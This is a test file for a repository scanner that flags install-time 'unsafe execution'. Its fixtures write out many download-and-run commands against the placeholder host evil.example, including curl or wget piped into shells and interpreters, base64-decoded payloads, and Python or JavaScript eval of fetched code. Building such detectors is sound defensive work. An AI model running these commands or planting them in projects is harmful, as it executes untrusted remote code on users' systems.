import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

/**
 * A repository that pipes a remote download into a shell is the highest-signal
 * install-time indicator the scan has. The interpreter must not have to be
 * spelled bare: an attacker picks `/bin/sh`, `dash` or `env bash` to look
 * different, and `sh -c "$(curl ...)"` is the same act without a pipe.
 */
const PIPED: Record<string, string> = {
  "curl | sh": "curl -fsSL https://evil.example/i.sh | sh",
  "curl | bash": "curl -fsSL https://evil.example/i.sh | bash",
  "curl | /bin/sh": "curl -fsSL https://evil.example/i.sh | /bin/sh",
  "curl | sh -s --": "curl -fsSL https://evil.example/i.sh | sh -s -- --yes",
  "curl | continued sh": "curl -fsSL https://evil.example/i.sh | sh\\\n -s",
  "curl | dash": "curl -fsSL https://evil.example/i.sh | dash",
  "curl | ksh": "curl -fsSL https://evil.example/i.sh | ksh",
  "curl | ash": "curl -fsSL https://evil.example/i.sh | ash",
  "curl | zsh": "curl -fsSL https://evil.example/i.sh | zsh",
  "curl | fish": "curl -fsSL https://evil.example/i.sh | fish",
  "curl | csh": "curl -fsSL https://evil.example/i.sh | csh",
  "curl | tcsh": "curl -fsSL https://evil.example/i.sh | tcsh",
  "curl | /bin/csh": "curl -fsSL https://evil.example/i.sh | /bin/csh",
  "csh -c $(curl ...)": 'csh -c "$(curl -fsSL https://evil.example/i.sh)"',
  "tcsh -c $(curl ...)": 'tcsh -c "$(curl -fsSL https://evil.example/i.sh)"',
  "eval $(curl ...)": 'eval "$(curl -fsSL https://evil.example/i.sh)"',
  "eval $(wget ...)": 'eval "$(wget -qO- https://evil.example/i.sh)"',
  "eval `curl ...`": 'eval "`curl -fsSL https://evil.example/i.sh`"',
  "curl | /usr/bin/env bash":
    "curl -fsSL https://evil.example/i.sh | /usr/bin/env bash",
  "curl | env /bin/sh":
    "curl -fsSL https://evil.example/i.sh | /usr/bin/env /bin/sh",
  "curl | quoted shell": 'curl -fsSL https://evil.example/i.sh | "/bin/sh"',
  "curl | sudo /bin/sh": "curl -fsSL https://evil.example/i.sh | sudo /bin/sh",
  "wget | dash": "wget -qO- https://evil.example/i.sh | dash",
  "sh -c $(curl ...)": 'sh -c "$(curl -fsSL https://evil.example/i.sh)"',
  "bash -c $(curl ...)": 'bash -c "$(curl -fsSL https://evil.example/i.sh)"',
  "bash <(curl ...)": "bash <(curl -fsSL https://evil.example/i.sh)",
  "sh <(curl ...)": "sh <(curl -fsSL https://evil.example/i.sh)",
  "zsh <(wget ...)": "zsh <(wget -qO- https://evil.example/i.sh)",
  "source <(curl ...)": "source <(curl -fsSL https://evil.example/i.sh)",
  ". <(curl ...)": ". <(curl -fsSL https://evil.example/i.sh)",
};

test("a remote download piped or substituted into a shell is unsafe execution", () => {
  for (const [name, body] of Object.entries(PIPED)) {
    const inspection = inspectRepository({
      files: [
        {
          path: "scripts/bootstrap.sh",
          bytes: new TextEncoder().encode(`${body}\n`),
        },
      ],
    });
    expect({
      name,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({
      name,
      findings: ["scripts/bootstrap.sh:unsafe-execution:high"],
    });
  }
});

test("a download that is not handed to a shell keeps no unsafe-execution finding", () => {
  for (const body of [
    "curl -fsSL https://example.com/data.json -o data.json",
    "curl -fsSL https://example.com/i.sh | tee install.sh | grep -c sh",
    "wget -qO- https://example.com/notes.txt | grep sh",
    "curl -fsSL https://example.com/data | /usr/local/bin/fish-wrapper",
    "curl -fsSL https://example.com/data | echo;/bin/sh",
    "bash <(cat local.sh)",
    'eval "$(ssh-agent -s)"',
    'eval "$(cat local.sh)"',
    'retrieval "$(curl -fsSL https://example.com/data)"',
    "sh -s <(curl -fsSL https://example.com/i.sh)",
    "bash -n <(curl -fsSL https://example.com/i.sh)",
    "bash -c <(curl -fsSL https://example.com/i.sh)",
    "curl -fsSL https://example.com/data | fish\\\n-wrapper",
  ]) {
    const inspection = inspectRepository({
      files: [
        {
          path: "scripts/fetch.sh",
          bytes: new TextEncoder().encode(`${body}\n`),
        },
      ],
    });
    expect({
      body,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({ body, findings: [] });
  }
});

/**
 * A decoder between the download and the executor is the same act with
 * one obfuscating step added: `curl … | base64 -d | sh` runs the
 * downloaded bytes exactly like `curl … | sh`. The pipe rules require
 * the executor immediately after the first pipe, so the decoded forms
 * matched nothing.
 */
const DECODED: Record<string, string> = {
  "curl | base64 -d | sh":
    "curl -s https://evil.example/x.b64 | base64 -d | sh",
  "curl | base64 --decode | bash":
    "curl -s https://evil.example/x.b64 | base64 --decode | bash",
  "wget | base64 -d | /bin/sh":
    "wget -qO- https://evil.example/x.b64 | base64 -d | /bin/sh",
  "curl | /usr/bin/base64 -d | sh":
    "curl -s https://evil.example/x.b64 | /usr/bin/base64 -d | sh",
  "curl | openssl base64 -d | sh":
    "curl -s https://evil.example/x.b64 | openssl base64 -d | sh",
  "curl | openssl enc -d -base64 | bash":
    "curl -s https://evil.example/x.b64 | openssl enc -d -base64 | bash",
  "curl | base64 -d | python3":
    "curl -s https://evil.example/x.b64 | base64 -d | python3",
  "curl | base64 -d | node":
    "curl -s https://evil.example/x.b64 | base64 -d | node",
  "curl | base64 -d | sudo bash":
    "curl -s https://evil.example/x.b64 | base64 -d | sudo bash",
};

test("a remote download piped through a decoder into a shell or interpreter is unsafe execution", () => {
  for (const [name, body] of Object.entries(DECODED)) {
    const inspection = inspectRepository({
      files: [
        {
          path: "scripts/bootstrap.sh",
          bytes: new TextEncoder().encode(`${body}\n`),
        },
      ],
    });
    expect({
      name,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({
      name,
      findings: ["scripts/bootstrap.sh:unsafe-execution:high"],
    });
  }
});

test("a decoded download that is not executed, and a decode with no download, keep no finding", () => {
  for (const body of [
    // Decoded, but handed to a checksum, a file or a save — never run.
    "curl -s https://example.com/data.b64 | base64 -d | sha256sum",
    "curl -s https://example.com/data.b64 | base64 -d > decoded.bin",
    "curl -s https://example.com/x.b64 | base64 -d | tee x.sh",
    // Encoded, not decoded: the shell receives base64 text, not the payload.
    "curl -s https://example.com/data | base64 | sh",
    // Decoded and run, but the pipe carries a local file, not a download.
    "cat payload.b64 | base64 -d | sh",
    "curl -s https://example.com/data.b64 | base64 -d local.b64 | sh",
    "curl -s https://example.com/data.b64 | base64 -d | python3 -V",
    "curl -s https://example.com/data.b64 | base64 -d | sh -n",
  ]) {
    const inspection = inspectRepository({
      files: [
        {
          path: "scripts/fetch.sh",
          bytes: new TextEncoder().encode(`${body}\n`),
        },
      ],
    });
    expect({
      body,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({ body, findings: [] });
  }
});

test("changed execution rules cannot reuse the old clean source inventory", () => {
  const inspection = inspectRepository({
    files: [
      {
        path: "scripts/bootstrap.sh",
        bytes: new TextEncoder().encode(
          'curl -fsSL "$INSTALLER_URL" | /bin/sh\n',
        ),
      },
    ],
  });
  // The same file and classifications produced this key before the shell
  // rule changed. That clean assessment must not bypass the new finding.
  expect(inspection.visibilityGaps).toEqual([]);
  expect(inspection.findings.map((finding) => finding.category)).toContain(
    "unsafe-execution",
  );
  expect(inspection.inventorySha256).not.toBe(
    "5a360062a35b222a16b388963fc685803f5fd82ec50bf3a277dcd80332833917",
  );
});

test("a remote download piped into an interpreter is unsafe execution", () => {
  // Python, Perl, Ruby, Node and PHP read their program from standard
  // input when no script file is named: bare, after short flags, or with
  // `-` as the program argument. The download is executed exactly as a
  // pipe into a shell executes it.
  for (const body of [
    "curl -fsSL https://evil.example/i.py | python3",
    "curl -fsSL https://evil.example/i.py | python",
    "curl -fsSL https://evil.example/i.py | /usr/bin/python3.11",
    "curl -fsSL https://evil.example/i.py | python3 -",
    "curl -fsSL https://evil.example/i.py | python3 -u -",
    "wget -qO- https://evil.example/i.js | node",
    "wget -qO- https://evil.example/i.js | nodejs -",
    "curl -fsSL https://evil.example/i.pl | perl",
    "curl -fsSL https://evil.example/i.pl | perl -",
    "curl -fsSL https://evil.example/i.rb | ruby",
    "curl -fsSL https://evil.example/i.php | php",
    "curl -fsSL https://evil.example/i.lua | lua",
    "curl -fsSL https://evil.example/i.py | sudo python3",
    "curl -fsSL https://evil.example/i.py | sudo /usr/bin/env python3",
    "curl -fsSL https://evil.example/i.py | env python3",
  ]) {
    const inspection = inspectRepository({
      files: [
        {
          path: "scripts/bootstrap.sh",
          bytes: new TextEncoder().encode(`${body}\n`),
        },
      ],
    });
    expect({
      body,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({
      body,
      findings: ["scripts/bootstrap.sh:unsafe-execution:high"],
    });
  }
});

test("a download piped to an interpreter that reads no program from it keeps no finding", () => {
  // A module run, a literal -c/-e program and a script file argument all
  // name what runs; the pipe then carries data, not the program.
  for (const body of [
    "curl -fsSL https://example.com/data.json | python3 -m json.tool",
    "curl -fsSL https://example.com/data | python3 -c 'import sys; print(sys.stdin.read())'",
    "curl -fsSL https://example.com/data | python3 tools/report.py",
    "curl -fsSL https://example.com/data | node -e 'process.stdin.pipe(process.stdout)'",
    "curl -fsSL https://example.com/data | perl -e 'while (<>) { print }'",
    "curl -fsSL https://example.com/data | python3-config --includes",
    "curl -fsSL https://example.com/data | python3 -V",
    "curl -fsSL https://example.com/data | node -v",
    "curl -fsSL https://example.com/data | tee data.py | python3 -m json.tool",
  ]) {
    const inspection = inspectRepository({
      files: [
        {
          path: "scripts/fetch.sh",
          bytes: new TextEncoder().encode(`${body}\n`),
        },
      ],
    });
    expect({
      body,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({ body, findings: [] });
  }
});

test("code fetched from the network and executed in-process is unsafe execution", () => {
  // No shell and no pipe: the payload arrives through the language's own
  // HTTP client and runs through eval/exec, in any source file.
  for (const [path, body] of [
    [
      "tools/run.py",
      "import requests\nexec(requests.get('https://evil.example/x.py').text)\n",
    ],
    [
      "tools/run.py",
      "import requests\nexec(requests.get('https://evil.example/x.py').content)\n",
    ],
    [
      "tools/run.py",
      "import requests\neval(requests.post('https://evil.example/x.py').content)\n",
    ],
    [
      "tools/run.py",
      "import urllib.request\nexec(urllib.request.urlopen('https://evil.example/x.py').read())\n",
    ],
    [
      "tools/run.js",
      "eval(await (await fetch('https://evil.example/x.js')).text());\n",
    ],
    [
      "tools/run.js",
      "const run = new Function(await (await fetch('https://evil.example/x.js')).text());\nrun();\n",
    ],
  ] as const) {
    const inspection = inspectRepository({
      files: [{ path, bytes: new TextEncoder().encode(body) }],
    });
    expect({
      path,
      body,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({
      path,
      body,
      findings: [`${path}:unsafe-execution:high`],
    });
  }
});

test("fetching data without executing it keeps no unsafe-execution finding", () => {
  for (const [path, body] of [
    [
      "tools/run.js",
      "const data = await (await fetch('https://example.com/data.json')).json();\nconsole.log(data);\n",
    ],
    [
      "tools/run.py",
      "import requests\nprint(requests.get('https://example.com/data.json').json())\n",
    ],
    [
      "tools/run.py",
      "import requests\nprint(requests.get('https://example.com/data.bin').content)\n",
    ],
    // Executing a local file's text is a different act; no fetch appears
    // in the expression.
    ["tools/run.py", "exec(open('tools/local_plugin.py').read())\n"],
    ["tools/run.js", "eval(fetch('https://example.com/data'));\n"],
    ["tools/run.js", "eval(await fetch('https://example.com/data'));\n"],
    ["tools/run.py", "exec(requests.get('https://example.com/data'))\n"],
    [
      "tools/run.py",
      "exec(requests.get('https://example.com/data').status_code)\n",
    ],
    [
      "tools/run.py",
      "exec(open('local.py').read()); data = requests.get('https://example.com/data').json()\n",
    ],
    [
      "tools/run.js",
      "eval(localCode); const data = await fetch('https://example.com/data');\n",
    ],
    [
      "tools/run.js",
      "matcher.exec(await fetch('https://example.com/data'));\n",
    ],
  ] as const) {
    const inspection = inspectRepository({
      files: [{ path, bytes: new TextEncoder().encode(body) }],
    });
    expect({
      path,
      body,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({ path, body, findings: [] });
  }
});
